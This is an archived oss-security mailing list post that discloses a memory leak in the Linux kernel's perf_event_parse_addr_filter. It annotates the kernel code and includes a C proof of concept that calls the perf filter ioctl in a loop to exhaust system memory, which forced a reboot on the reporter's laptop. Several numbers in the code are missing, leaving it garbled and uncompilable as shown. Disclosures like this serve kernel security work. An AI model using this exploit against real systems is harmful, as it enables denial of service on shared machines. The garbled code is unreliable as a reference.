  oss-security - Linux kernel: perf_event_parse_addr_filter memory  leak            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 9 Nov From: kiyin(ĺ°šäşŽ) <kiyin@...cent.com> To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com> Subject: Linux kernel: perf_event_parse_addr_filter memory  leak  CVE assigned:  Patch:  Details:  Hi,  There is a memory leak in perf_event_parse_addr_filter. Here is the detail.         static int        perf_event_parse_addr_filter(struct perf_event *event, char *fstr,                         struct list_head *filters)        { ......................................................................................................................................................................................................................                    if (token == IF_SRC_FILE || token == IF_SRC_FILEADDR) {                        int fpos = token == IF_SRC_FILE ? 2 : 1;                                filename = match_strdup(&args[fpos]);                       <--------------- match_strdup allocates memory for filename                        if (!filename) {                            ret = -ENOMEM;                            goto fail;                        }                    } ......................................................................................................................................................................................................................                    if (filter->action == PERF_ADDR_FILTER_ACTION_FILTER &&         <--------------- if filter->action == PERF_ADDR_FILTER_ACTION_FILTER and filter->size is zero, go to failed branch                        !filter->size)                        goto fail;         ......................................................................................................................................................................................................................        fail_free_name:            kfree(filename);        fail:                                                                       <--------------- filename is not freed in the failed branch. that causes a memory leak.            free_filters_list(filters);            kfree(orig);                    return ret;        }    the length of filename is no limit. using the following test code, it will take 40 seconds to exhaust 16GB memory in my laptop: CPU intel i5 kernel version then I have to press power button to reboot the system manually.  #include <sys/ioctl.h> #include <linux/perf_event.h> #include <unistd.h> #include <string.h>  #define __NR_perf_event_open     static long perf_event_open( struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags ) {     int ret;      ret = syscall( __NR_perf_event_open, hw_event, pid, cpu, group_fd, flags );     return ret; }  char buf[11 + * * 16 + 1] = { 0 };  int main( void ) {     int fd1, i;     struct perf_event_attr pe1 = { 0 };      pe1.type = 9; // may be different in other system. just run" cat /sys/bus/event_source/devices/intel_pt/type"     pe1.exclude_kernel = 1;     pe1.exclude_hv = 1;     pe1.exclude_idle = 1;      fd1 = perf_event_open( &pe1, getpid(), -1, -1, 0 );     if ( fd1 > 0 )     {         memset( buf, 'A', 11 + * * 16 ); //filename length is 16MB         memcpy( buf, "filter,0/0@", 11 );          for ( i = 0; i < i++ )         {             ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak         }          buf[11 + * = '\0'; //filename length is 1MB         for ( i = 0; i < 16; i++ )         {             ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak         }          buf[11 + = '\0'; //filename length is 1KB         while ( 1 )             ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak the rest     }     return 0; }  Regards, kiyin.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      